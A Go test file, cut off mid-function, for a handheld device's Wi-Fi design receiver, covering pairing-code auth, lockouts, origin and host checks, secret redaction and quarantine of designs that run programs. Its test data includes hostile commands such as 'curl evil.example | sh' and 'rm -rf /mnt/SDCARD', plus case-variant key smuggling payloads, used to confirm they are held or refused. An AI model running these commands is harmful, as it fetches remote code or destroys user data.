package main

// livebuilder_test.go exercises the Wi-Fi design receiver end to end at the HTTP
// level: the same handlers the handheld serves, a temporary config file, and a
// reload callback standing in for the watcher. The abuse limits run on a fake
// clock.

import (
	"bytes"
	"encoding/json"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync/atomic"
	"testing"
	"time"
)

const liveBuilderTestCode = "482913"

func liveBuilderTestConfig(sceneName string) []byte {
	return []byte(`{
  "AppName": "JukaHub",
  "Version": "0.4.0",
  "Width": 1280,
  "Height": 720,
  "variables": {"fontSizes": {"medium": 24}},
  "scenes": [{
    "name": "` + sceneName + `",
    "elements": [{"type": "label", "text": "Hello", "x": 10, "y": 10, "width": 200, "height": 40}]
  }]
}`)
}

// liveBuilderProgramConfig is a design with a button that runs a program.
func liveBuilderProgramConfig(sceneName, program string) []byte {
	return []byte(`{
  "AppName": "JukaHub",
  "Version": "0.4.0",
  "Width": 1280,
  "Height": 720,
  "variables": {"fontSizes": {"medium": 24}},
  "scenes": [{
    "name": "` + sceneName + `",
    "elements": [{"type": "button", "text": "Play", "x": 10, "y": 10, "width": 200, "height": 40,
      "trigger": "external_app", "externalAppPath": "` + program + `"}]
  }]
}`)
}

func newLiveBuilderTestServer(t *testing.T, initial []byte) (*liveBuilderServer, string, *int32) {
	t.Helper()
	path := filepath.Join(t.TempDir(), "jukaconfig.json")
	if initial != nil {
		if err := os.WriteFile(path, initial, 0o644); err != nil {
			t.Fatalf("write initial config: %v", err)
		}
	}
	var reloads int32
	srv := newLiveBuilderServer(path, liveBuilderTestCode, func() { atomic.AddInt32(&reloads, 1) })
	return srv, path, &reloads
}

// liveBuilderTestClock makes the server's clock a variable the test moves.
func liveBuilderTestClock(srv *liveBuilderServer) *time.Time {
	clock := time.Date(2026, 11, 9, 12, 0, 0, 0, time.UTC)
	srv.now = func() time.Time { return clock }
	return &clock
}

func liveBuilderRequestFrom(t *testing.T, handler http.Handler, method, path string, body []byte, code, remote string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(method, path, bytes.NewReader(body))
	req.Host = "192.168.1.50:8422"
	if remote != "" {
		req.RemoteAddr = remote
	}
	if code != "" {
		req.Header.Set(liveBuilderCodeHeader, code)
	}
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, req)
	return rec
}

func liveBuilderRequest(t *testing.T, handler http.Handler, method, path string, body []byte, code string) *httptest.ResponseRecorder {
	t.Helper()
	return liveBuilderRequestFrom(t, handler, method, path, body, code, "")
}

// liveBuilderJSON decodes a JSON document a test reads back.
func liveBuilderJSON(t *testing.T, data []byte) map[string]interface{} {
	t.Helper()
	var doc map[string]interface{}
	if err := json.Unmarshal(data, &doc); err != nil {
		t.Fatalf("not JSON: %v\n%s", err, data)
	}
	return doc
}

func TestLiveBuilderPushRequiresCorrectCode(t *testing.T) {
	initial := liveBuilderTestConfig("Original")
	srv, path, reloads := newLiveBuilderTestServer(t, initial)
	handler := srv.handler()

	for _, code := range []string{"", "000000", "48291"} {
		rec := liveBuilderRequest(t, handler, http.MethodPost, "/api/design", liveBuilderTestConfig("Hijacked"), code)
		if rec.Code != http.StatusUnauthorized {
			t.Errorf("code %q: status = %d, want 401", code, rec.Code)
		}
	}
	if atomic.LoadInt32(reloads) != 0 {
		t.Error("unauthorised push triggered a reload")
	}
	onDisk, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(onDisk, initial) {
		t.Error("unauthorised push modified the config file")
	}
}

func TestLiveBuilderIgnoresCodeInTheURL(t *testing.T) {
	srv, _, _ := newLiveBuilderTestServer(t, liveBuilderTestConfig("Main"))
	rec := liveBuilderRequest(t, srv.handler(), http.MethodGet, "/api/design?code="+liveBuilderTestCode, nil, "")
	if rec.Code != http.StatusUnauthorized {
		t.Errorf("code in the query string: status = %d, want 401 (the header is the only way)", rec.Code)
	}
}

func TestLiveBuilderPushWritesBacksUpAndReloads(t *testing.T) {
	initial := liveBuilderTestConfig("Original")
	srv, path, reloads := newLiveBuilderTestServer(t, initial)
	handler := srv.handler()

	body := []byte(`{
  "AppName": "JukaHub",
  "Version": "0.4.0",
  "Width": 1024,
  "Height": 768,
  "futureTopLevel": {"kept": true},
  "variables": {"fontSizes": {"big": 40}},
  "scenes": [{
    "name": "Pushed",
    "elements": [
      {"type": "button", "text": "Go", "x": 20, "y": 30, "width": 200, "height": 60, "futureElementField": "kept"}
    ]
  }]
}`)
	rec := liveBuilderRequest(t, handler, http.MethodPost, "/api/design", body, liveBuilderTestCode)
	if rec.Code != http.StatusOK {
		t.Fatalf("push status = %d, want 200 (body %s)", rec.Code, rec.Body.String())
	}
	var result liveBuilderResponse
	if err := json.Unmarshal(rec.Body.Bytes(), &result); err != nil {
		t.Fatalf("push response: %v", err)
	}
	if !result.OK || result.Quarantined || result.Scenes != 1 || result.Elements != 1 || !result.Reloaded {
		t.Errorf("push response = %+v, want ok/1 scene/1 element/reloaded", result)
	}
	if atomic.LoadInt32(reloads) != 1 {
		t.Errorf("reload calls = %d, want 1", atomic.LoadInt32(reloads))
	}

	backup, err := os.ReadFile(path + ".bak")
	if err != nil {
		t.Fatalf("backup missing: %v", err)
	}
	if !bytes.Equal(backup, initial) {
		t.Error("backup does not contain the previous design")
	}

	saved, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	doc := liveBuilderJSON(t, saved)
	if doc["schemaVersion"] != float64(ConfigSchemaVersion) {
		t.Errorf("schemaVersion = %v, want %d", doc["schemaVersion"], ConfigSchemaVersion)
	}
	if _, ok := doc["futureTopLevel"]; !ok {
		t.Error("unknown top-level field was stripped from the pushed design")
	}
	scenes := doc["scenes"].([]interface{})
	elements := scenes[0].(map[string]interface{})["elements"].([]interface{})
	if _, ok := elements[0].(map[string]interface{})["futureElementField"]; !ok {
		t.Error("unknown element field was stripped from the pushed design")
	}

	// A second push backs up the first, and no backup of the backup appears.
	if rec := liveBuilderRequest(t, handler, http.MethodPost, "/api/design", liveBuilderTestConfig("Second"), liveBuilderTestCode); rec.Code != http.StatusOK {
		t.Fatalf("second push status = %d (body %s)", rec.Code, rec.Body.String())
	}
	if backup, _ := os.ReadFile(path + ".bak"); !bytes.Equal(backup, saved) {
		t.Error("the second push did not back up the first")
	}
	if _, err := os.Stat(path + ".bak.bak"); !os.IsNotExist(err) {
		t.Errorf("a backup of the backup was written (%v)", err)
	}
}

func TestLiveBuilderRejectsInvalidDesignWithoutTouchingFile(t *testing.T) {
	initial := liveBuilderTestConfig("Original")
	srv, path, reloads := newLiveBuilderTestServer(t, initial)
	handler := srv.handler()

	cases := []struct {
		name string
		body []byte
	}{
		{"not json", []byte(`{"scenes": [`)},
		{"array instead of object", []byte(`[]`)},
		{"no scenes", []byte(`{"AppName":"JukaHub","scenes":[]}`)},
		{"empty element type", []byte(`{"scenes":[{"name":"Main","elements":[{"type":"","x":0,"y":0}]}]}`)},
		{"newer schema", []byte(`{"schemaVersion":99,"scenes":[{"name":"Main","elements":[]}]}`)},
	}
	for _, tc := range cases {
		rec := liveBuilderRequest(t, handler, http.MethodPost, "/api/design", tc.body, liveBuilderTestCode)
		if rec.Code != http.StatusUnprocessableEntity {
			t.Errorf("%s: status = %d, want 422", tc.name, rec.Code)
		}
	}
	if atomic.LoadInt32(reloads) != 0 {
		t.Error("invalid design triggered a reload")
	}
	onDisk, _ := os.ReadFile(path)
	if !bytes.Equal(onDisk, initial) {
		t.Error("invalid design modified the config file")
	}
}

func TestLiveBuilderRefusesCaseVariantKeys(t *testing.T) {
	initial := liveBuilderTestConfig("Original")
	srv, path, reloads := newLiveBuilderTestServer(t, initial)
	handler := srv.handler()
	// Go's decoder fills a field from either spelling while the saved map keeps
	// both, so these could show one design to the checks and another to the
	// player.
	bodies := map[string][]byte{
		"element trigger": []byte(`{"scenes":[{"name":"Main","elements":[{"type":"button","x":1,"y":1,
			"trigger":"external_app","Trigger":"change_scene:Main","externalAppPath":"sh x","ExternalAppPath":""}]}]}`),
		"variables block": []byte(`{"variables":{},"Variables":{"terminal_cmd":"sh x"},
			"scenes":[{"name":"Main","elements":[{"type":"label","x":1,"y":1}]}]}`),
		"long s": []byte(`{"variables":{"tools_path":"","toolſ_path":"x"},
			"scenes":[{"name":"Main","elements":[{"type":"label","x":1,"y":1}]}]}`),
	}
	for name, body := range bodies {
		rec := liveBuilderRequest(t, handler, http.MethodPost, "/api/design", body, liveBuilderTestCode)
		if rec.Code != http.StatusUnprocessableEntity || !strings.Contains(rec.Body.String(), "letter case") {
			t.Errorf("%s: status = %d (%s), want 422 about letter case", name, rec.Code, rec.Body.String())
		}
	}
	if onDisk, _ := os.ReadFile(path); !bytes.Equal(onDisk, initial) || atomic.LoadInt32(reloads) != 0 {
		t.Error("a design with case-variant keys changed the device")
	}
	if _, ok := srv.Pending(); ok {
		t.Error("a design with case-variant keys was held instead of refused")
	}
}

func TestLiveBuilderPullsCurrentDesign(t *testing.T) {
	initial := liveBuilderTestConfig("Pulled")
	srv, _, _ := newLiveBuilderTestServer(t, initial)
	handler := srv.handler()

	rec := liveBuilderRequest(t, handler, http.MethodGet, "/api/design", nil, liveBuilderTestCode)
	if rec.Code != http.StatusOK {
		t.Fatalf("pull status = %d, want 200", rec.Code)
	}
	if got := rec.Header().Get("Content-Type"); !strings.HasPrefix(got, "application/json") {
		t.Errorf("pull content-type = %q", got)
	}
	if !bytes.Equal(rec.Body.Bytes(), initial) {
		t.Error("pull did not return the config bytes")
	}
	if rec := liveBuilderRequest(t, handler, http.MethodGet, "/api/design", nil, ""); rec.Code != http.StatusUnauthorized {
		t.Errorf("unpaired pull status = %d, want 401", rec.Code)
	}
}

func TestLiveBuilderKeepsSecretsOnTheDevice(t *testing.T) {
	initial := []byte(`{
  "AppName": "JukaHub", "Version": "0.4.0", "Width": 1280, "Height": 720,
  "channel_profile": {"channel_id": "123", "token": "bot-token"},
  "variables": {"fontSizes": {"medium": 24}, "discord_token": "ENC:abcd", "google_api_key": "AIzaSecret", "weatherUnit": "C"},
  "scenes": [{"name": "Main", "elements": [{"type": "label", "text": "Hi", "x": 10, "y": 10, "width": 200, "height": 40}]}]
}`)
	srv, path, _ := newLiveBuilderTestServer(t, initial)
	handler := srv.handler()

	rec := liveBuilderRequest(t, handler, http.MethodGet, "/api/design", nil, liveBuilderTestCode)
	if rec.Code != http.StatusOK {
		t.Fatalf("pull status = %d", rec.Code)
	}
	if body := rec.Body.String(); strings.Contains(body, "AIzaSecret") || strings.Contains(body, "ENC:abcd") || strings.Contains(body, "bot-token") {
		t.Fatalf("the pull carried a secret:\n%s", body)
	}
	pulled := liveBuilderJSON(t, rec.Body.Bytes())
	vars := pulled["variables"].(map[string]interface{})
	profile := pulled["channel_profile"].(map[string]interface{})
	if vars["discord_token"] != liveBuilderKeptValue || vars["google_api_key"] != liveBuilderKeptValue || profile["token"] != liveBuilderKeptValue {
		t.Errorf("secrets not replaced by the placeholder: %v / %v", vars, profile)
	}
	if vars["weatherUnit"] != "C" || profile["channel_id"] != "123" {
		t.Errorf("ordinary values were hidden too: %v / %v", vars, profile)
	}

	// Edit and push the pulled design back: the secrets stay what they were,
	// and a placeholder for something the device never had disappears.
	pulled["scenes"].([]interface{})[0].(map[string]interface{})["name"] = "Edited"
	vars["new_secret_token"] = liveBuilderKeptValue
	body, err := json.Marshal(pulled)
	if err != nil {
		t.Fatal(err)
	}
	if rec := liveBuilderRequest(t, handler, http.MethodPost, "/api/design", body, liveBuilderTestCode); rec.Code != http.StatusOK {
		t.Fatalf("push of the pulled design: status = %d (%s), want 200", rec.Code, rec.Body.String())
	}
	saved, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	doc := liveBuilderJSON(t, saved)
	savedVars := doc["variables"].(map[string]interface{})
	savedProfile := doc["channel_profile"].(map[string]interface{})
	if savedVars["discord_token"] != "ENC:abcd" || savedVars["google_api_key"] != "AIzaSecret" || savedProfile["token"] != "bot-token" {
		t.Errorf("a pull and push changed the secrets: %v / %v", savedVars, savedProfile)
	}
	if _, ok := savedVars["new_secret_token"]; ok {
		t.Error("a placeholder for a value the device never had was saved")
	}
	if doc["scenes"].([]interface{})[0].(map[string]interface{})["name"] != "Edited" {
		t.Error("the edit itself was lost")
	}

	// A new secret value is a change the owner approves.
	vars["google_api_key"] = "AIzaSomeoneElse"
	delete(vars, "new_secret_token")
	body, _ = json.Marshal(pulled)
	if rec := liveBuilderRequest(t, handler, http.MethodPost, "/api/design", body, liveBuilderTestCode); rec.Code != http.StatusAccepted {
		t.Errorf("push with a new key: status = %d, want 202", rec.Code)
	}
}

func TestLiveBuilderRejectsOversizedBody(t *testing.T) {
	srv, _, _ := newLiveBuilderTestServer(t, liveBuilderTestConfig("Main"))
	big := bytes.Repeat([]byte("x"), liveBuilderMaxBody+1)
	rec := liveBuilderRequest(t, srv.handler(), http.MethodPost, "/api/design", big, liveBuilderTestCode)
	if rec.Code != http.StatusRequestEntityTooLarge {
		t.Errorf("oversized push status = %d, want 413", rec.Code)
	}
}

func TestLiveBuilderStatusPageNeverShowsCode(t *testing.T) {
	srv, _, _ := newLiveBuilderTestServer(t, liveBuilderTestConfig("Main"))
	handler := srv.handler()
	// Loopback is exactly where another web page in the same browser comes
	// from, so it gets no more than the LAN does.
	for _, remote := range []string{"192.168.1.77:4567", "127.0.0.1:4567", "[::1]:4567"} {
		rec := liveBuilderRequestFrom(t, handler, http.MethodGet, "/", nil, "", remote)
		if rec.Code != http.StatusOK {
			t.Fatalf("%s: status page = %d, want 200", remote, rec.Code)
		}
		if strings.Contains(rec.Body.String(), liveBuilderTestCode) {
			t.Errorf("%s: the status page exposed the pairing code", remote)
		}
		if rec.Header().Get("X-Frame-Options") != "DENY" {
			t.Errorf("%s: the status page may be framed", remote)
		}
	}
}

func TestLiveBuilderLocksOutAfterWrongCodes(t *testing.T) {
	srv, _, _ := newLiveBuilderTestServer(t, liveBuilderTestConfig("Main"))
	clock := liveBuilderTestClock(srv)
	handler := srv.handler()
	const attacker, other = "192.168.1.66:5000", "192.168.1.20:5000"

	for i := 0; i < liveBuilderFailLimit; i++ {
		rec := liveBuilderRequestFrom(t, handler, http.MethodGet, "/api/design", nil, "111111", attacker)
		if rec.Code != http.StatusUnauthorized {
			t.Fatalf("wrong code %d: status = %d, want 401", i+1, rec.Code)
		}
		*clock = clock.Add(time.Second)
	}
	// Locked out: even the right code is not compared.
	rec := liveBuilderRequestFrom(t, handler, http.MethodGet, "/api/design", nil, liveBuilderTestCode, attacker)
	if rec.Code != http.StatusTooManyRequests {
		t.Fatalf("after %d wrong codes: status = %d, want 429", liveBuilderFailLimit, rec.Code)
	}
	if rec.Header().Get("Retry-After") == "" {
		t.Error("the lockout answer has no Retry-After")
	}
	// Another sender is not affected.
	if rec := liveBuilderRequestFrom(t, handler, http.MethodGet, "/api/design", nil, liveBuilderTestCode, other); rec.Code != http.StatusOK {
		t.Errorf("another sender: status = %d, want 200", rec.Code)
	}
	// The lockout ends.
	*clock = clock.Add(liveBuilderLockout + time.Second)
	if rec := liveBuilderRequestFrom(t, handler, http.MethodGet, "/api/design", nil, liveBuilderTestCode, attacker); rec.Code != http.StatusOK {
		t.Errorf("after the lockout: status = %d, want 200", rec.Code)
	}
}

func TestLiveBuilderDoesNotCountMissingCodes(t *testing.T) {
	srv, _, _ := newLiveBuilderTestServer(t, liveBuilderTestConfig("Main"))
	liveBuilderTestClock(srv)
	handler := srv.handler()
	// An <img> on any web page sends no header: that is no guess, and must not
	// lock the builder out.
	for i := 0; i < 2*liveBuilderFailLimit; i++ {
		if rec := liveBuilderRequestFrom(t, handler, http.MethodGet, "/api/design", nil, "", "127.0.0.1:5000"); rec.Code != http.StatusUnauthorized {
			t.Fatalf("request %d without a code: status = %d, want 401", i+1, rec.Code)
		}
	}
	if rec := liveBuilderRequestFrom(t, handler, http.MethodGet, "/api/design", nil, liveBuilderTestCode, "127.0.0.1:5000"); rec.Code != http.StatusOK {
		t.Errorf("after requests without a code: status = %d, want 200", rec.Code)
	}
}

func TestLiveBuilderGroupsIPv6ByPrefix(t *testing.T) {
	srv, _, _ := newLiveBuilderTestServer(t, liveBuilderTestConfig("Main"))
	liveBuilderTestClock(srv)
	handler := srv.handler()
	// One machine can rotate through its whole /64, so the /64 is the sender.
	for i := 1; i <= liveBuilderFailLimit; i++ {
		remote := "[2001:db8::" + strconv.FormatInt(int64(i), 16) + "]:5000"
		if rec := liveBuilderRequestFrom(t, handler, http.MethodGet, "/api/design", nil, "111111", remote); rec.Code != http.StatusUnauthorized {
			t.Fatalf("wrong code from %s: status = %d, want 401", remote, rec.Code)
		}
	}
	if rec := liveBuilderRequestFrom(t, handler, http.MethodGet, "/api/design", nil, liveBuilderTestCode, "[2001:db8::ffff]:5000"); rec.Code != http.StatusTooManyRequests {
		t.Errorf("same /64 after %d wrong codes: status = %d, want 429", liveBuilderFailLimit, rec.Code)
	}
	if rec := liveBuilderRequestFrom(t, handler, http.MethodGet, "/api/design", nil, liveBuilderTestCode, "[2001:db8:0:1::1]:5000"); rec.Code != http.StatusOK {
		t.Errorf("another /64: status = %d, want 200", rec.Code)
	}
}

func TestLiveBuilderSpreadsLockoutAcrossSenders(t *testing.T) {
	srv, _, _ := newLiveBuilderTestServer(t, liveBuilderTestConfig("Main"))
	clock := liveBuilderTestClock(srv)
	srv.codePath = filepath.Join(t.TempDir(), liveBuilderCodeFile)
	var changes int32
	srv.onCodeChange = func() { atomic.AddInt32(&changes, 1) }
	handler := srv.handler()
	// One wrong code each from many addresses stays under the per-sender
	// limit, so only the shared limit can stop it.
	for i := 0; i < liveBuilderGlobalLimit; i++ {
		remote := "10.0.1." + strconv.Itoa(i+1) + ":5000"
		if rec := liveBuilderRequestFrom(t, handler, http.MethodGet, "/api/design", nil, "111111", remote); rec.Code != http.StatusUnauthorized {
			t.Fatalf("wrong code %d: status = %d, want 401", i+1, rec.Code)
		}
	}
	rec := liveBuilderRequestFrom(t, handler, http.MethodGet, "/api/design", nil, liveBuilderTestCode, "10.0.2.1:5000")
	if rec.Code != http.StatusTooManyRequests {
		t.Fatalf("after %d wrong codes from everyone: status = %d, want 429", liveBuilderGlobalLimit, rec.Code)
	}
	// The pause replaced the code: a guess that got close starts again.
	fresh := srv.Code()
	if fresh == liveBuilderTestCode || len(fresh) != 6 || atomic.LoadInt32(&changes) != 1 {
		t.Fatalf("code after the pause = %q (changes %d), want a new six-digit code", fresh, atomic.LoadInt32(&changes))
	}
	if saved, err := os.ReadFile(srv.codePath); err != nil || strings.TrimSpace(string(saved)) != fresh {
		t.Errorf("the new code was not saved: %q, %v", saved, err)
	}
	*clock = clock.Add(liveBuilderGlobalLockout + time.Second)
	if rec := liveBuilderRequestFrom(t, handler, http.MethodGet, "/api/design", nil, liveBuilderTestCode, "10.0.2.1:5000"); rec.Code != http.StatusUnauthorized {
		t.Errorf("the old code after the pause: status = %d, want 401", rec.Code)
	}
	if rec := liveBuilderRequestFrom(t, handler, http.MethodGet, "/api/design", nil, fresh, "10.0.2.1:5000"); rec.Code != http.StatusOK {
		t.Errorf("the new code after the pause: status = %d, want 200", rec.Code)
	}
}

func TestLiveBuilderOnlyAnswersTheBuildersOrigins(t *testing.T) {
	srv, _, _ := newLiveBuilderTestServer(t, liveBuilderTestConfig("Main"))
	handler := srv.handler()
	cases := []struct {
		origin string
		ok     bool
	}{
		{"https://generate.jukalang.com", true},
		{"http://localhost:5173", true},
		{"http://127.0.0.1:8000", true},
		{"http://[::1]:8000", true},
		{"https://evil.example", false},
		{"http://localhost.evil.example", false},
		{"null", false},
	}
	for _, tc := range cases {
		// A GET without a code answers 401 for an allowed origin (with the
		// CORS header, so the builder can read why) and 403 for any other.
		for _, method := range []string{http.MethodOptions, http.MethodGet} {
			req := httptest.NewRequest(method, "/api/design", nil)
			req.Host = "192.168.1.50:8422"
			req.Header.Set("Origin", tc.origin)
			rec := httptest.NewRecorder()
			handler.ServeHTTP(rec, req)
			allow := rec.Header().Get("Access-Control-Allow-Origin")
			if tc.ok {
				if allow != tc.origin {
					t.Errorf("%s %s: Allow-Origin = %q, want the origin echoed", method, tc.origin, allow)
				}
				if rec.Code == http.StatusForbidden {
					t.Errorf("%s %s: refused an allowed origin", method, tc.origin)
				}
				continue
			}
			if allow != "" || rec.Code != http.StatusForbidden {
				t.Errorf("%s %s: status %d, Allow-Origin %q; want 403 and none", method, tc.origin, rec.Code, allow)
			}
		}
	}
}

func TestLiveBuilderRefusesForeignHostNames(t *testing.T) {
	srv, _, _ := newLiveBuilderTestServer(t, liveBuilderTestConfig("Main"))
	handler := srv.handler()
	for host, ok := range map[string]bool{
		"192.168.1.50:8422":        true,
		"localhost:8422":           true,
		"[::1]:8422":               true,
		"jukahub.local:8422":       true,
		"rebind.evil.example:8422": false,
		"evil.example":             false,
	} {
		req := httptest.NewRequest(http.MethodGet, "/api/design", nil)
		req.Host = host
		rec := httptest.NewRecorder()
		handler.ServeHTTP(rec, req)
		if got := rec.Code != http.StatusMisdirectedRequest; got != ok {
			t.Errorf("Host %q: status %d, allowed = %v, want %v", host, rec.Code, got, ok)
		}
	}
	// The builder's own origin can read why a host name was refused.
	req := httptest.NewRequest(http.MethodGet, "/api/design", nil)
	req.Host = "rebind.evil.example:8422"
	req.Header.Set("Origin", "http://localhost:5173")
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, req)
	if rec.Code != http.StatusMisdirectedRequest || rec.Header().Get("Access-Control-Allow-Origin") != "http://localhost:5173" {
		t.Errorf("refused host for the builder: status %d, Allow-Origin %q", rec.Code, rec.Header().Get("Access-Control-Allow-Origin"))
	}
}

func TestLiveBuilderHoldsDesignsThatRunPrograms(t *testing.T) {
	initial := liveBuilderTestConfig("Original")
	srv, path, reloads := newLiveBuilderTestServer(t, initial)
	var changes int32
	srv.onPendingChange = func() { atomic.AddInt32(&changes, 1) }
	handler := srv.handler()

	risky := liveBuilderProgramConfig("Pushed", "rm -rf /mnt/SDCARD")
	rec := liveBuilderRequest(t, handler, http.MethodPost, "/api/design", risky, liveBuilderTestCode)
	if rec.Code != http.StatusAccepted {
		t.Fatalf("risky push: status = %d, want 202 (body %s)", rec.Code, rec.Body.String())
	}
	var result liveBuilderResponse
	if err := json.Unmarshal(rec.Body.Bytes(), &result); err != nil {
		t.Fatal(err)
	}
	if !result.Quarantined || len(result.Details) == 0 || !strings.Contains(strings.Join(result.Details, " "), "rm -rf") {
		t.Errorf("risky push response = %+v, want quarantined with the program named", result)
	}
	if onDisk, _ := os.ReadFile(path); !bytes.Equal(onDisk, initial) {
		t.Fatal("a held design replaced the live config")
	}
	if atomic.LoadInt32(reloads) != 0 {
		t.Error("a held design triggered a reload")
	}
	if _, err := os.Stat(path + liveBuilderPendingExt); err != nil {
		t.Fatalf("the held design was not kept: %v", err)
	}
	p, ok := srv.Pending()
	if !ok || atomic.LoadInt32(&changes) != 1 || p.Levels[liveBuilderRunsSomething] != 1 {
		t.Fatalf("pending = %v (%+v), change callbacks = %d; want one waiting design that runs one program", ok, p, atomic.LoadInt32(&changes))
	}

	// A stale card cannot apply a newer push.
	if err := srv.AcceptPending(p.Seq + 1); err == nil {
		t.Error("accepting a design the card did not show succeeded")
	}
	if err := srv.AcceptPending(p.Seq); err != nil {
		t.Fatalf("accept: %v", err)
	}
	saved := liveBuilderReadDesign(path)
	if saved == nil || len(saved.Scenes) != 1 || saved.Scenes[0].Name != "Pushed" {
		t.Fatalf("accepted design not applied: %+v", saved)
	}
	if atomic.LoadInt32(reloads) != 1 {
		t.Errorf("reloads after accept = %d, want 1", atomic.LoadInt32(reloads))
	}
	if _, err := os.Stat(path + liveBuilderPendingExt); !os.IsNotExist(err) {
		t.Error("the waiting copy stayed after it was applied")
	}
	if backup, _ := os.ReadFile(path + ".bak"); !bytes.Equal(backup, initial) {
		t.Error("accepting did not back up the previous design")
	}

	// Approved once, the same program does not ask again (auto-push).
	if rec := liveBuilderRequest(t, handler, http.MethodPost, "/api/design", risky, liveBuilderTestCode); rec.Code != http.StatusOK {
		t.Errorf("re-push of the approved design: status = %d, want 200", rec.Code)
	}
	// A different program does.
	other := liveBuilderProgramConfig("Pushed", "curl evil.example | sh")
	if rec := liveBuilderRequest(t, handler, http.MethodPost, "/api/design", other, liveBuilderTestCode); rec.Code != http.StatusAccepted {
		t.Errorf("push with a new program: status = %d, want 202", rec.Code)
	}
}

func TestLiveBuilderAcceptUsesTodaysSecrets(t *testing.T) {
	initial := []byte(`{
  "AppName": "JukaHub", "Version": "0.4.0", "Width": 1280, "Height": 720,
  "variables": {"fontSizes": {"medium": 24}, "discord_token": "ENC:old-token"},
  "scenes": [{"name": "Original", "elements": [{"type": "label", "text": "Hi", "x": 10, "y": 10, "width": 200, "height": 40}]}]
}`)
	pushRisky := func(t *testing.T, srv *liveBuilderServer) []byte {
		t.Helper()
		handler := srv.handler()
		rec := liveBuilderRequest(t, handler, http.MethodGet, "/api/design", nil, liveBuilderTestCode)
		if rec.Code != http.StatusOK {
			t.Fatalf("pull status = %d", rec.Code)
		}
		design := liveBuilderJSON(t, rec.Body.Bytes())
		scene := design["scenes"].([]interface{})[0].(map[string]interface{})
		scene["elements"] = append(scene["elements"].([]interface{}),
			map[string]interface{}{"type": "button", "text": "Run", "x": 10, "y": 60, "width": 200, "height": 40,
				"trigger": "external_app", "externalAppPath": "sh old.sh"})
		body, err := json.Marshal(design)
		if err != nil {
			t.Fatal(err)
		}
		if rec := liveBuilderRequest(t, handler, http.MethodPost, "/api/design", body, liveBuilderTestCode); rec.Code != http.StatusAccepted {
			t.Fatalf("risky push: status = %d (%s), want 202", rec.Code, rec.Body.String())
		}
		return body
	}

	// The waiting file must not contain the device's secret; accepting it
	// restores the value from the current file.
	srv, path, _ := newLiveBuilderTestServer(t, initial)
	pushRisky(t, srv)
	pending, _ := os.ReadFile(path + liveBuilderPendingExt)
	if bytes.Contains(pending, []byte("old-token")) {
		t.Fatal("the waiting design carried the device's kept value")
	}
	p, ok := srv.Pending()
	if !ok {
		t.Fatal("nothing waiting")
	}
	if err := srv.AcceptPending(p.Seq); err != nil {
		t.Fatalf("accept: %v", err)
	}
	saved := liveBuilderJSON(t, func() []byte { data, _ := os.ReadFile(path); return data }())
	if got := saved["variables"].(map[string]interface{})["discord_token"]; got != "ENC:old-token" {
		t.Errorf("accepted design token = %v, want the device's old token", got)
	}

	// If the device's secret changes while the card waits, accepting would
	// put the stale one back; the design is refused and the new one stays.
	srv, path, _ = newLiveBuilderTestServer(t, initial)
	pushRisky(t, srv)
	p, _ = srv.Pending()
	changed := liveBuilderJSON(t, initial)
	changed["variables"].(map[string]interface{})["discord_token"] = "ENC:new-token"
	changedBytes, err := json.Marshal(changed)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, changedBytes, 0o644); err != nil {
		t.Fatal(err)
	}
	if err := srv.AcceptPending(p.Seq); err == nil {
		t.Fatal("a waiting design was accepted after the device's secret changed")
	}
	if onDisk, _ := os.ReadFile(path); !bytes.Contains(onDisk, []byte("ENC:new-token")) {
		t.Fatal("refusing the stale design overwrote the device's new token")
	}
	if _, ok := srv.Pending(); ok {
		t.Error("the stale design still waits after it was refused")
	}
}

func TestLiveBuilderProtectedGuessIsAlwaysAChange(t *testing.T) {
	initial := []byte(`{
  "AppName": "JukaHub", "Version": "0.4.0", "Width": 1280, "Height": 720,
  "variables": {"fontSizes": {"medium": 24}, "discord_token": "ENC:secret"},
  "scenes": [{"name": "Main", "elements": [{"type": "label", "text": "Hi", "x": 10, "y": 10, "width": 200, "height": 40}]}]
}`)
	srv, _, _ := newLiveBuilderTestServer(t, initial)
	handler := srv.handler()

	pull := func() map[string]interface{} {
		t.Helper()
		rec := liveBuilderRequest(t, handler, http.MethodGet, "/api/design", nil, liveBuilderTestCode)
		if rec.Code != http.StatusOK {
			t.Fatalf("pull status = %d", rec.Code)
		}
		return liveBuilderJSON(t, rec.Body.Bytes())
	}
	push := func(design map[string]interface{}) *httptest.ResponseRecorder {
		t.Helper()
		body, err := json.Marshal(design)
		if err != nil {
			t.Fatal(err)
		}
		return liveBuilderRequest(t, handler, http.MethodPost, "/api/design", body, liveBuilderTestCode)
	}

	// Spelling out the device's exact secret is a change, exactly like a
	// wrong guess: neither answer tells the sender whether it was right.
	for _, guess := range []string{"ENC:secret", "ENC:wrong"} {
		design := pull()
		design["variables"].(map[string]interface{})["discord_token"] = guess
		if rec := push(design); rec.Code != http.StatusAccepted {
			t.Errorf("guess %q: status = %d (%s), want 202", guess, rec.Code, rec.Body.String())
		}
		if p, ok := srv.Pending(); ok {
			srv.RejectPending(p.Seq)
		}
	}

	// The placeholder still means "keep what is there" and goes through.
	design := pull()
	design["variables"].(map[string]interface{})["discord_token"] = liveBuilderKeptValue
	if rec := push(design); rec.Code != http.StatusOK {
		t.Fatalf("placeholder push: status = %d (%s), want 200", rec.Code, rec.Body.String())
	}
}

func TestLiveBuilderWaitingDesignBlocksOtherPushes(t *testing.T) {
	initial := liveBuilderTestConfig("Original")
	srv, path, _ := newLiveBuilderTestServer(t, initial)
	handler := srv.handler()
	risky := liveBuilderProgramConfig("Pushed", "sh evil.sh")
	if rec := liveBuilderRequest(t, handler, http.MethodPost, "/api/design", risky, liveBuilderTestCode); rec.Code != http.StatusAccepted {
		t.Fatalf("risky push: status = %d, want 202", rec.Code)
	}
	first, _ := srv.Pending()
	// Nothing may swap the design the card is showing.
	if rec := liveBuilderRequest(t, handler, http.MethodPost, "/api/design", liveBuilderTestConfig("Plain"), liveBuilderTestCode); rec.Code != http.StatusConflict {
		t.Errorf("push while a design waits: status = %d, want 409", rec.Code)
	}
